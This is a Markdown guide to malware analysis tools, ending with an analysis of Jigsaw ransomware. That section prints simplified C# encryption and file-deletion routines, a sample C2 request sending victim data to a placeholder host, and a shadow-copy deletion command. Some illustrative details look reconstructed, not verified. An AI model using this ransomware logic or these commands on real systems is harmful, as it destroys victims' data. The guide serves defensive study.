### Comprehensive Guide to Malware Analysis Tools and Techniques

## Table of Contents

- [Types of Malware](#types-of-malware)
- [Malware Analysis Resources](#malware-analysis-resources)
- [Static Analysis Tools](#static-analysis-tools)
- [Dynamic Analysis Tools](#dynamic-analysis-tools)
- [Automated Analysis Platforms](#automated-analysis-platforms)
- [Command Line Tools](#command-line-tools)
- [Packers and Droppers](#packers-and-droppers)
- [Jigsaw Ransomware: A Detailed Analysis](#jigsaw-ransomware-a-detailed-analysis)
## Types of Malware

Malware (malicious software) encompasses various types of harmful programs designed to infiltrate, damage, or gain unauthorized access to computer systems. Here's a comprehensive classification:
### Viruses

- **Definition**: Self-replicating malicious code that attaches to legitimate programs
- **Behavior**: Spreads by infecting other files when executed
- **Examples**: Melissa, ILOVEYOU, CIH/Chernobyl
### Worms

- **Definition**: Self-replicating malware that spreads across networks without user interaction
- **Behavior**: Exploits vulnerabilities to propagate automatically
- **Examples**: WannaCry (also ransomware), Conficker, Stuxnet
### Trojans

- **Definition**: Malware disguised as legitimate software
- **Behavior**: Performs malicious actions while appearing harmless
- **Examples**: Zeus, DarkComet, Emotet
### Ransomware

- **Definition**: Malware that encrypts files and demands payment for decryption
- **Behavior**: Locks access to data or systems until ransom is paid
- **Examples**: Jigsaw, WannaCry, Ryuk, Petya, CryptoLocker
### Spyware

- **Definition**: Software that secretly monitors user activity
- **Behavior**: Collects sensitive information without consent
- **Examples**: Pegasus, FlexiSpy, CoolWebSearch
### Adware

- **Definition**: Software that displays unwanted advertisements
- **Behavior**: Generates revenue through forced ad views
- **Examples**: Fireball, Superfish, Gator
### Rootkits

- **Definition**: Malware that provides persistent privileged access while hiding its presence
- **Behavior**: Modifies operating system to conceal malicious activities
- **Examples**: ZeroAccess, Stuxnet (component), TDSS
### Keyloggers

- **Definition**: Software that records keystrokes
- **Behavior**: Captures passwords and sensitive information
- **Examples**: Olympic Vision, Ardamax Keylogger
### Botnets

- **Definition**: Networks of infected computers controlled remotely
- **Behavior**: Used for DDoS attacks, spam distribution, or cryptocurrency mining
- **Examples**: Mirai, Emotet, Gameover Zeus
### Fileless Malware

- **Definition**: Malware that operates in memory without writing files to disk
- **Behavior**: Evades traditional file-based detection methods
- **Examples**: PowerShell Empire, Astaroth
### Backdoors

- **Definition**: Malware that creates alternative access methods to systems
- **Behavior**: Bypasses normal authentication mechanisms
- **Examples**: PlugX, Gh0st RAT
### Remote Access Trojans (RATs)

- **Definition**: Malware providing full control over infected systems
- **Behavior**: Allows attackers to remotely access and control computers
- **Examples**: DarkComet, njRAT, QuasarRAT

## Malware Analysis Resources

### MalShare

- **Type**: Online Malware Repository
- **URL**: [https://malshare.com/](https://malshare.com/)
- **Platform**: Web
- **Description**: A community-driven repository for sharing malware samples. Researchers can upload, download, and search for malware samples using hashes or other identifiers. Requires API key for full access.
- **Example Usage**:

```c
curl -F "upload=@sample.exe" https://malshare.com/api.php?api_key=<API_KEY>&action=upload
```

- **Features**:
	- Sample submission and retrieval
	- Hash-based searching
	- API for automation
	- Recent submissions feed
	- YARA rule matching
### theZoo

- **Type**: Malware Repository
- **URL**: [https://github.com/ytisf/theZoo/](https://github.com/ytisf/theZoo/)
- **Platform**: GitHub
- **Description**: An open-source repository containing live malware samples for research purposes. Contains a collection of malware samples organized by type and family, with metadata and analysis information.
- **Example Usage**:

```c
git clone https://github.com/ytisf/theZoo.git
```

- **Features**:
	- Categorized malware samples
	- Includes metadata and descriptions
	- Samples are password-protected for safety
	- Includes a Python management interface
	- Regular updates with new malware families
### Malware Bazaar

- **Type**: Malware Sharing Platform
- **URL**: [https://bazaar.abuse.ch/browse/](https://bazaar.abuse.ch/browse/)
- **Platform**: Web
- **Description**: A resource for sharing and analyzing malware samples, operated by abuse.ch. Focuses on tracking and sharing malware samples to enhance security research and threat intelligence.
- **Example Usage**:

```c
curl -X POST https://mb-api.abuse.ch/api/v1/ -d query=get_info -d hash=<HASH>
```

- **Features**:
	- Malware sample submission and retrieval
	- Comprehensive search functionality
	- API for automation
	- Integration with MalwareCage sandbox
	- Tag-based classification system
## Static Analysis Tools

Static analysis examines malware without executing it, analyzing code structure, strings, and file properties.

### WinMD5

- **Type**: Hash Verification Tool
- **Platform**: Windows
- **Description**: A simple utility for calculating and verifying MD5 hashes of files. Useful for identifying known malware samples by comparing hashes with threat intelligence databases.
- **Usage**: GUI-based application where you select a file and calculate its MD5 hash
- **Example Output**:

```c
File: sample.exe
MD5: d41d8cd98f00b204e9800998ecf8427e
```

- **Features**:
	- Fast MD5 calculation
	- Hash verification against known values
	- Batch processing capability
	- Simple and lightweight interface
### PEiD

- **Type**: Packer Detection Tool
- **Platform**: Windows
- **Description**: Detects common packers, cryptors, and compilers used in PE (Portable Executable) files. Helps identify if a malware sample has been packed or obfuscated to evade detection.
- **Usage**: GUI-based application where you open a suspicious file to detect its packer
- **Example Output**:

```c
Packer: UPX 3.0 [NRV]
Compiler: Microsoft Visual C++ 6.0
```

- **Features**:
	- Large signature database
	- Plugin support
	- Entropy analysis
	- EP (Entry Point) section detection
	- Customizable signatures
### PEStudio

- **Type**: PE Analysis Tool
- **Platform**: Windows
- **Description**: A comprehensive tool for analyzing PE files, identifying suspicious attributes, and detecting potential malicious indicators. Provides detailed information about file structure, imports, exports, and resources.
- **Usage**: GUI-based application where you load a file for analysis
- **Example Output**: Displays detailed information about:
	- File headers and sections
	- Imported and exported functions
	- Resources and strings
	- Digital signatures
	- Suspicious indicators highlighted in red

- **Features**:
	- Comprehensive PE file analysis
	- Blacklist checking
	- VirusTotal integration
	- Anomaly detection
	- Reporting capabilities

### PPEE (Puppy)

- **Type**: PE Examination Tool
- **Platform**: Windows
- **Description**: PE file explorer showing headers, sections, imports, and exports. Provides a user-friendly interface for examining the structure of PE files and identifying potential malicious indicators.
- **Usage**: GUI-based application where you open a PE file for analysis
- **Example Output**: Displays:
	- PE header information
	- Section details with entropy values
	- Import and export tables
	- Resource directory
	- Color-coded suspicious elements

- **Features**:
	- Intuitive interface
	- Hex viewer
	- String extraction
	- Resource viewer
	- Comparison of multiple files
### PeBear

- **Type**: PE Analysis Tool
- **Platform**: Windows
- **Description**: A lightweight tool for analyzing PE files with a focus on malware analysis. Provides a clean interface for examining PE structure and allows for editing capabilities.
- **Usage**: GUI-based application where you open a PE file for analysis
- **Example Output**: Shows:
	- PE structure with editing capabilities
	- Import and export tables
	- Resources and sections
	- Signatures and certificates

- **Features**:
	- PE structure editing
	- Hex editor
	- Resource viewer
	- Import/export table analysis
	- Section analysis with entropy calculation
### Exiftool

- **Type**: Metadata Analysis Tool
- **Platform**: Windows/Linux
- **Description**: A powerful tool for reading, writing, and manipulating metadata in files. Useful for extracting hidden information and identifying anomalies in file metadata.
- **Example Command**:

```c
exiftool sample.exe
```

- **Example Output**:

```c
ExifTool Version Number         : 12.30
File Name                       : sample.exe
Directory                       : .
File Size                       : 2.5 MB
File Modification Date/Time     : 2023:05:06 10:23:45+00:00
File Access Date/Time           : 2023:05:06 10:23:45+00:00
File Type                       : Win32 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : Intel 386 or later, and compatibles
Time Stamp                      : 2023:05:01 12:34:56+00:00
PE Type                         : PE32
Linker Version                  : 14.0
Code Size                       : 102400
Initialized Data Size           : 143360
Uninitialized Data Size         : 0
Entry Point                     : 0x14e90
OS Version                      : 6.0
Image Version                   : 0.0
Subsystem Version               : 6.0
Subsystem                       : Windows GUI
```

- **Features**:
	- Extracts comprehensive metadata
	- Supports numerous file formats
	- Command-line and GUI versions available
	- Can modify metadata
	- Batch processing capabilities
### Strings

- **Type**: String Extraction Tool
- **Platform**: Windows/Linux
- **Description**: Extracts printable strings from binary files. Essential for identifying potential command and control servers, file paths, and other indicators in malware.
- **Example Command**:

```c
strings sample.exe
```

- **Example Output**:

```c
GetProcAddress
LoadLibraryA
kernel32.dll
RegCreateKeyExA
RegSetValueExA
advapi32.dll
http://malicious.com/c2
Software\Microsoft\Windows\CurrentVersion\Run
.encrypt
AES_encrypt
```

- **Features**:
	- Configurable minimum string length
	- Unicode support
	- Can search specific memory ranges
	- Output formatting options
	- Available on most platforms
### File

- **Type**: File Type Identification Tool
- **Platform**: Linux
- **Description**: Determines file type by examining file contents, regardless of extension. Useful for identifying disguised malware and understanding file structure.
- **Example Command**:

```c
file sample.exe
```

- **Example Output**:

```c
sample.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

- **Features**:
	- Identifies file types based on content
	- Recognizes numerous file formats
	- Provides detailed information about file structure
	- Can process multiple files
	- Regular expression support
### Diec

- **Type**: File Identification Tool
- **Platform**: Linux
- **Description**: Specialized tool for detecting packers, compilers, and obfuscators in executable files. Particularly useful for identifying how malware is packed or obfuscated.
- **Example Command**:

```c
diec sample.exe
```

- **Example Output**:

```c
PE32 {
  compiler: Microsoft Visual C/C++ (19XX)
  packer: UPX (3.91) [NRV]
  linker: Microsoft Linker (8.0)
  overlay: 2048 bytes
}
```

- **Features**:
	- Extensive signature database
	- Detects multiple layers of packing
	- Identifies compilers and linkers
	- Provides detailed information about file structure
	- Regular updates to signature database
### PeFrame

- **Type**: PE Analysis Framework
- **Platform**: Linux
- **Description**: A framework to perform static analysis on PE malware. Combines multiple analysis techniques to provide comprehensive information about PE files.
- **Example Command**:

```c
peframe sample.exe
```

- **Example Output**:

```c
[+] File Details
    Name: sample.exe
    Size: 2.5 MB
    Type: PE32 executable
    MD5:  d41d8cd98f00b204e9800998ecf8427e
    SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709

[+] Sections
    Name: .text   | VirtualAddress: 0x1000  | VirtualSize: 0x19000 | Entropy: 6.7
    Name: .rdata  | VirtualAddress: 0x1a000 | VirtualSize: 0x8000  | Entropy: 5.2
    Name: .data   | VirtualAddress: 0x22000 | VirtualSize: 0x4000  | Entropy: 3.8

[+] Suspicious API
    CreateProcessA
    WriteProcessMemory
    VirtualAllocEx
    RegSetValueExA

[+] Anti-Debug Techniques
    IsDebuggerPresent
    CheckRemoteDebuggerPresent
    GetTickCount

[+] Network Indicators
    IP:   192.168.1.100
    URL:  http://malicious.com/c2
    Host: malicious.com
```

- **Features**:
	- Comprehensive PE file analysis
	- Detects anti-debug and anti-VM techniques
	- Identifies suspicious APIs
	- Extracts network indicators
	- Calculates section entropy
### Floss

- **Type**: Advanced String Extraction Tool
- **Platform**: Windows/Linux
- **Description**: FireEye Labs Obfuscated String Solver - extracts obfuscated strings from malware that traditional string extraction tools might miss. Particularly effective against string obfuscation techniques.
- **Example Command**:

```c
floss sample.exe
```

- **Example Output**:

```c
FLOSS decoded 42 strings

Decoded strings:
CreateMutexA
Global\MalwareMutex
C:\Windows\System32\svchost.exe
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
MalwareAutorun
http://command.and.control.server/gate.php

FLOSS extracted 15 stack strings

Stack strings:
InitializeRegistry
DownloadNextStage
AES_KEY_HERE
```

- **Features**:
	- Decodes obfuscated strings
	- Extracts stack strings
	- Identifies tight loops for deobfuscation
	- Supports multiple deobfuscation techniques
	- Command-line options for customization

### SHA256Sum

- **Type**: Hash Calculation Tool
- **Platform**: Linux
- **Description**: Calculates SHA256 hash of files. Essential for uniquely identifying malware samples and checking against threat intelligence databases.
- **Example Command**:

```c
sha256sum sample.exe
```

- **Example Output**:

```c
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 sample.exe
```

- **Features**:
	- Fast and accurate SHA256 calculation
	- Can process multiple files
	- Verification against known hashes
	- Standard on most Linux distributions
	- Used in many automated malware analysis workflows
## Dynamic Analysis Tools

Dynamic analysis involves executing malware in a controlled environment to observe its behavior.
### Regshot

- **Type**: Registry Monitoring Tool
- **Platform**: Windows
- **Description**: Takes snapshots of the Windows registry before and after executing a program, then compares them to identify changes. Essential for identifying persistence mechanisms and other registry modifications made by malware.
- **Usage**: GUI-based application with a simple workflow:
	1. Take first shot (before running malware)
	2. Run the malware sample
	3. Take second shot (after running malware)
	4. Compare the shots to see changes

- **Example Output**:

```c
Registry changes:

Values added:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Malware: "C:\Users\Admin\AppData\Roaming\malware.exe"
HKEY_CURRENT_USER\Software\MalwareConfig\C2: "http://malicious.com/c2"

Values modified:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr: 0x00000001

Keys added:
HKEY_CURRENT_USER\Software\MalwareConfig
```

- **Features**:
	- Fast registry comparison
	- Can also monitor file system changes
	- HTML and text report generation
	- Customizable scanning options
	- Lightweight and portable

### Wireshark

- **Type**: Network Analysis Tool
- **Platform**: Windows/Linux
- **Description**: Powerful network protocol analyzer that captures and interactively browses network traffic. Essential for monitoring malware communication with command and control servers and data exfiltration attempts.
- **Example Command**:

```c
wireshark -i eth0 -k -w capture.pcap
```

- **Usage**: Can be used via GUI or command line to capture and analyze network traffic
- **Example Output**: Detailed packet capture showing:

- DNS queries to suspicious domains
- HTTP/HTTPS requests to command and control servers
- Unusual protocols or port usage
- Data exfiltration attempts
- Encrypted communication patterns

- **Features**:
	- Deep packet inspection
	- Protocol analysis and decoding
	- Filtering capabilities
	- Follow TCP stream functionality
	- Export to various formats
	- Plugin support
### Process Monitor

- **Type**: System Activity Monitor
- **Platform**: Windows
- **Description**: Advanced monitoring tool from Sysinternals that shows real-time file system, registry, and process/thread activity. Provides comprehensive visibility into malware behavior on a system.
- **Usage**: GUI-based application where you:
	1. Configure filters (optional)
	2. Start capture
	3. Run malware
	4. Stop capture and analyze results

- **Example Output**: Detailed log of system activities including:
	- File operations (create, read, write, delete)
	- Registry operations (query, create, delete)
	- Process and thread creation/termination
	- Network connections
	- Each entry includes timestamp, process name, operation, and result

- **Features**:
	- Real-time monitoring
	- Advanced filtering system
	- Stack traces for operations
	- Save and load captures
	- Integration with other Sysinternals tools
### Strace

- **Type**: System Call Tracer
- **Platform**: Linux
- **Description**: Traces system calls and signals in Linux. Allows analysts to see how malware interacts with the operating system at a low level.
- **Example Command**:

```c
strace -o trace.txt ./malware
```

- **Example Output**:

```c
execve("./malware", ["./malware"], [/* 21 vars */]) = 0
brk(NULL)                               = 0x55d45e9a1000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=17827, ...}) = 0
close(3)                                = 0
open("/etc/passwd", O_RDONLY)           = 3
read(3, "root:x:0:0:root:/root:/bin/b"..., 4096) = 1176
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
connect(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.168.1.100")}, 16) = 0
```

- **Features**:
	- Detailed system call tracing
	- Can attach to running processes
	- Filtering options for specific system calls
	- Signal interception
	- Follow child processes
### LTrace

- **Type**: Library Call Tracer
- **Platform**: Linux
- **Description**: Traces library calls made by programs. Complements strace by showing higher-level function calls to shared libraries.
- **Example Command**:

```c
ltrace -o ltrace.txt ./malware
```

- **Example Output**:

```c
__libc_start_main(0x400580, 1, 0x7ffc32a27b58, 0x400670 <unfinished ...>
malloc(256)                                      = 0x55d45e9a12a0
fopen("/etc/passwd", "r")                        = 0x55d45e9a1320
fgets("root:x:0:0:root:/root:/bin/bash\n", 256, 0x55d45e9a1320) = 0x55d45e9a12a0
strcpy(0x55d45e9a1400, "root")                   = 0x55d45e9a1400
socket(2, 1, 6)                                  = 4
connect(4, 0x55d45e9a1500, 16)                   = 0
send(4, "stolen_data", 11, 0)                    = 11
```

- **Features**:
	- Traces calls to library functions
	- Can show function arguments and return values
	- Filtering options
	- Can attach to running processes
	- Customizable output format

## Automated Analysis Platforms

### VirusTotal

- **Type**: Multi-AV Scanner and Analysis Platform
- **URL**: [https://www.virustotal.com/](https://www.virustotal.com/)
- **Description**: Analyzes suspicious files using multiple antivirus engines and provides additional analysis of file characteristics. Essential for initial triage of suspicious files and quick assessment of potential threats.
- **Usage**: Upload file through web interface or API
- **Example API Usage**:

```c
curl --request POST --url https://www.virustotal.com/api/v3/files --form file=@sample.exe
```

- **Features**:
	- Analysis with 70+ antivirus engines
	- File behavior analysis
	- YARA rule matching
	- Community comments and votes
	- Related samples identification
	- URL scanning capabilities
	- API for automation
### Hybrid Analysis

- **Type**: Malware Analysis Sandbox
- **URL**: [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)
- **Description**: Provides detailed behavioral analysis of malware by executing samples in isolated environments. Offers comprehensive reports on malware behavior and indicators of compromise.
- **Usage**: Upload sample through web interface or API
- **Features**:

- Multiple environment options (Windows, Linux)
- Detailed behavioral analysis
- Network traffic capture
- Process tree visualization
- MITRE ATT&CK mapping
- YARA rule generation
- API for automation

### ANY.RUN

- **Type**: Interactive Malware Analysis Sandbox
- **URL**: [https://any.run/](https://any.run/)
- **Description**: Interactive malware analysis service with real-time process visualization. Unique in allowing analysts to interact with the sandbox environment during analysis.
- **Usage**: Upload sample through web interface
- **Features**:

- Interactive analysis session
- Real-time process tree visualization
- Network traffic monitoring
- Screenshot capture
- MITRE ATT&CK mapping
- Community submissions
- Customizable analysis environment

## Command Line Tools

### Reverse Engineering Tools

### Radare2 (r2)

- **Type**: Disassembler and Debugger
- **Platform**: Windows/Linux
- **Description**: Open-source, command-line based disassembler, debugger, and reverse engineering framework. Powerful tool for analyzing malware code and understanding its functionality.
- **Example Command**:

```c
r2 -A sample.exe
```


- **Example Output**: Opens an interactive shell with analysis results
- **Common Commands**:

- `afl` - List all functions

```c
0x00401000    1 42           entry0
0x00401030   16 286          fcn.00401030
0x00401150    1 107          fcn.00401150
0x004011c0    1 16           sym.imp.kernel32.dll_GetProcAddress
```


- `izz` - List all strings

```c
000 0x0040a000 0x0040a000  17  18 (.rdata) ascii GetProcAddress
001 0x0040a012 0x0040a012  12  13 (.rdata) ascii LoadLibraryA
002 0x0040a020 0x0040a020  12  13 (.rdata) ascii kernel32.dll
```


- `ii` - List imports

```c
[Imports]
ordinal=001 plt=0x004011c0 bind=NONE type=FUNC name=kernel32.dll_GetProcAddress
ordinal=002 plt=0x004011d0 bind=NONE type=FUNC name=kernel32.dll_LoadLibraryA
```

- **Features**:
	- Disassembly and decompilation
	- Debugging capabilities
	- Binary patching
	- Scripting support
	- Extensive plugin system
	- Support for multiple architectures and file formats
### Cutter

- **Type**: GUI for radare2
- **Platform**: Windows/Linux
- **Description**: Graphical interface for radare2, making it more accessible for visual analysis. Combines the power of radare2 with a user-friendly interface.
- **Usage**: GUI-based application

- **Features**:
	- Disassembly view
	- Graph view for visual code analysis
	- Hex editor
	- Python scripting console
	- Debugger integration
	- Decompiler plugins
	- Cross-platform support
### IDA Pro

- **Type**: Professional Disassembler and Debugger
- **Platform**: Windows/Linux
- **Description**: Industry-standard disassembler and debugger used by professional malware analysts and reverse engineers. Provides comprehensive analysis capabilities for understanding complex malware.
- **Usage**: GUI-based application
- **Features**:
	- Advanced disassembly engine
	- Interactive graphical representation of code
	- Multi-processor and multi-compiler support
	- FLIRT (Fast Library Identification and Recognition Technology)
	- Scripting support (IDC, Python)
	- Debugger for dynamic analysis
	- Decompiler plugins for various architectures

### Malware Scanning Tools

### ClamAV

- **Type**: Open-Source Antivirus Engine
- **Platform**: Windows/Linux
- **Description**: Free, cross-platform antivirus software with command-line scanning capabilities. Useful for detecting known malware based on signatures.
- **Example Command**:

```c
clamscan sample.exe
```

- **Example Output**:

```c
sample.exe: Trojan.Agent-1234 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 8607446
Engine version: 0.103.5
Scanned files: 1
Infected files: 1
Data scanned: 2.50 MB
Data read: 2.50 MB (ratio 1.00:1)
Time: 16.170 sec (0 m 16 s)
```

- **Features**:
	- Large signature database
	- Low resource usage
	- Command-line and daemon modes
	- Support for various file formats
	- Regular database updates
	- Integration with email servers and file servers
### FreshClam

- **Type**: ClamAV Database Updater
- **Platform**: Windows/Linux
- **Description**: Utility for updating ClamAV virus databases. Ensures that ClamAV has the latest signatures for malware detection.
- **Example Command**:

```c
freshclam
```

- **Example Output**:

```c
ClamAV update process started at Wed May 6 12:34:56 2023
main.cvd is up to date (version: 61, sigs: 6607162, f-level: 90, builder: sven)
daily.cvd is up to date (version: 26559, sigs: 1894102, f-level: 90, builder: raynman)
bytecode.cvd is up to date (version: 333, sigs: 92, f-level: 90, builder: neo)
```

- **Features**:
	- Automatic database updates
	- Proxy support
	- Configurable update frequency
	- Database integrity verification
	- Incremental updates to save bandwidth
### Qu1ckSc0pe

- **Type**: Static Malware Analysis Tool
- **Platform**: Linux
- **Description**: Comprehensive static analysis tool that combines multiple techniques to analyze suspicious files. Provides a quick overview of potential malicious indicators.
- **Example Command**:

```c
python3 qu1cksc0pe.py -f sample.exe
```

- **Example Output**: Detailed report including:
	- File information (type, size, hashes)
	- Detected strings (URLs, IPs, emails)
	- Imported functions categorized by purpose
	- Potential capabilities (keylogging, persistence, etc.)
	- YARA rule matches

- **Features**:
	- Comprehensive static analysis
	- YARA rule scanning
	- Capability detection
	- String extraction and categorization
	- Import analysis
	- Extensible plugin system
### Capa

- **Type**: Capability Detection Tool
- **Platform**: Windows/Linux
- **Description**: FLARE team's tool for detecting capabilities in executable files. Uses a rule-based approach to identify what a program can do based on its code.
- **Example Command**:

```c
capa sample.exe
```

- **Example Output**:

```c
+---------------------------+----------------------------------+
| CAPABILITY                | NAMESPACE                        |
+---------------------------+----------------------------------+
| create mutex              | host-interaction/synchronization |
| encrypt data using RC4    | data-manipulation/encryption     |
| persist via Run key       | persistence/registry             |
| check if debugger present | anti-analysis/anti-debugging     |
| resolve API functions     | load-code/api-resolution         |
| send HTTP request         | communication/http               |
+---------------------------+----------------------------------+
```

- **Features**:
	- Identifies program capabilities
	- Rule-based detection system
	- MITRE ATT&CK mapping
	- Works without executing the sample
	- Community-maintained rules
	- Detailed explanations of detected capabilities
## Packers and Droppers

### Packers

- **Definition**: Software that compresses, encrypts, or obfuscates executable files
- **Purpose**:
	- Evade antivirus detection
	- Reduce file size
	- Protect intellectual property
	- Complicate reverse engineering

- **Common Packers**:
	- **UPX**: Universal Packer for eXecutables - open-source packer that compresses executables
	- **Themida**: Advanced commercial protector with virtualization capabilities
	- **VMProtect**: Uses virtualization to protect code
	- **ASPack**: Commercial packer focusing on compression
	- **MPRESS**: Free packer for PE and .NET executables

- **Detection**: Tools like PEiD, Exeinfo PE, or DIE can identify common packers
- **Example Command**: `upx -d packed_sample.exe` (unpacks a UPX-packed file)
- **Indicators**:
	- High entropy in code sections
	- Few imports but complex functionality
	- Suspicious section names (.UPX, .aspack)
	- Multiple layers of compression

### Droppers

- **Definition**: Programs that install malware on a system
- **Purpose**: Deliver and install the actual malware payload
- **Behavior**: Often appear legitimate but contain hidden malicious code
- **Types**:
	- **One-stage droppers**: Contain the actual malware embedded within them
	- **Two-stage droppers**: Download the malware from a remote server after execution

- **Analysis Approach**:
	- Monitor file system activity to identify dropped files
	- Track network connections for downloaded payloads
	- Examine memory for unpacked/injected code
	- Look for persistence mechanisms established by the dropper

- **Common Techniques**:
	- Process injection
	- DLL side-loading
	- Living-off-the-land binaries (LOLBins)
	- Scheduled tasks for persistence

## Jigsaw Ransomware: A Detailed Analysis

### Overview

Jigsaw is a notorious ransomware that first appeared in March 2016. It gained its name from the iconic character "Billy the Puppet" from the Saw horror movie franchise, which it displays on its ransom note. Jigsaw combines file encryption with psychological manipulation by progressively deleting files until the ransom is paid.

### Technical Characteristics

#### Basic Information

- **First Detected**: March 2016
- **Written in**: .NET (C#)
- **Encryption**: AES encryption for files
- **Extensions**: Adds .fun, .kkk, .btc, or .gws to encrypted files
- **Ransom Amount**: Typically demands $150 in Bitcoin
- **C2 Communication**: HTTP-based communication with command and control servers
#### Infection Vector

Jigsaw is primarily distributed through:

- Spam email attachments
- Malicious downloads (fake cracks/keygens)
- Compromised websites
- Malvertising campaigns
#### File System Operations

Upon execution, Jigsaw:
1. Creates a copy of itself in `%AppData%` folder
2. Establishes persistence via registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
3. Scans for files with specific extensions (documents, images, videos)
4. Encrypts files using AES encryption
5. Adds custom extension to encrypted files
6. Creates a Bitcoin wallet address file for payment
#### Unique Deletion Mechanism

What makes Jigsaw particularly malicious:
- Starts a timer that deletes files progressively
- Deletes a certain number of files every hour
- Increases the number of deleted files each hour
- Threatens to delete all remaining files after 72 hours
- Deletes 1000 files if the victim tries to terminate the process or restart the computer
#### Ransom Note

The ransom note displays:
- The iconic "Billy the Puppet" image
- A countdown timer
- Instructions for Bitcoin payment
- Warnings about file deletion
- A text field for entering the Bitcoin transaction ID
### Code Analysis

A simplified version of Jigsaw's core encryption function:

```csharp
private void EncryptFile(string file)
{
    byte[] fileContent = File.ReadAllBytes(file);
    using (RijndaelManaged AES = new RijndaelManaged())
    {
        AES.KeySize = 256;
        AES.BlockSize = 128;
        AES.Mode = CipherMode.CBC;
        AES.Padding = PaddingMode.PKCS7;
        AES.Key = encryptionKey;
        AES.IV = iv;
        
        using (MemoryStream ms = new MemoryStream())
        {
            using (CryptoStream cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cs.Write(fileContent, 0, fileContent.Length);
                cs.FlushFinalBlock();
                
                byte[] encryptedData = ms.ToArray();
                File.WriteAllBytes(file + ".fun", encryptedData);
                File.Delete(file);
            }
        }
    }
}
```

The file deletion function that gives Jigsaw its distinctive behavior:

```csharp
private void DeleteFiles()
{
    int filesToDelete = hoursPassed * 1000; // Increases with time
    
    for (int i = 0; i < filesToDelete && i < encryptedFiles.Count; i++)
    {
        try
        {
            File.Delete(encryptedFiles[i]);
            deletedFiles.Add(encryptedFiles[i]);
            encryptedFiles.RemoveAt(i);
        }
        catch { }
    }
    
    UpdateRansomNote();
}
```

### Network Behavior

Jigsaw communicates with its C2 servers to:

- Verify successful infection
- Confirm ransom payment
- Potentially receive decryption keys
- Report system information


Typical HTTP requests observed:

```c
POST /payment_verification.php HTTP/1.1
Host: [malicious-domain].com
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

bitcoin_address=[address]&computer_name=[hostname]&encrypted_files=[count]
```

### Registry Modifications

Jigsaw makes several registry changes:

```c
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Jigsaw = "%AppData%\jigsaw.exe"
HKCU\Software\Jigsaw\Installed = "True"
HKCU\Software\Jigsaw\PaymentStatus = "Pending"
HKCU\Software\Jigsaw\EncryptionTime = "[timestamp]"
```

### Detection Methods

#### Static Analysis Indicators
- File properties showing .NET compilation
- Strings containing "jigsaw", "bitcoin", "delete", "encrypt"
- References to the System.Security.Cryptography namespace
- Presence of the Billy/Saw image resource
- Import of Timer-related functions
#### Dynamic Analysis Indicators
- Creation of files in %AppData% directory
- Registry modifications for persistence
- Mass file access operations
- Network communication to known C2 servers
- Deletion of Shadow Volume Copies via command:

```c
vssadmin delete shadows /all /quiet
```
### Decryption and Recovery

Several security researchers have developed decryption tools for Jigsaw:
- The ransomware stores the encryption key locally
- The key can be extracted from memory or registry
- Files can be recovered even after encryption

Example decryption command using publicly available tools:

```c
JigsawDecryptor.exe -d C:\Encrypted\Files\
```

### Variants and Evolution

Since its initial release, Jigsaw has evolved:
1. **Original Jigsaw**: Used .fun, .kkk extensions, $150 ransom
2. **Jigsaw v2**: Used .payransom, .paymst extensions, $200 ransom
3. **CryptoHitman**: Modified interface but same core code
4. **Jigsaw Reborn**: Added more file types and improved encryption
### Mitigation Strategies

To protect against Jigsaw and similar ransomware:
1. Maintain regular backups on disconnected media
2. Keep operating systems and software updated
3. Use reputable antivirus and anti-malware solutions
4. Implement email filtering to block suspicious attachments
5. Train users to recognize phishing attempts
6. Use application whitelisting where possible
7. Disable macros in Office documents
8. Implement the principle of least privilege
### Incident Response

If infected with Jigsaw:
1. Disconnect from networks immediately
2. Do not pay the ransom
3. Use available decryption tools
4. Restore from backups if available
5. Report to law enforcement
6. Perform a full system scan after recovery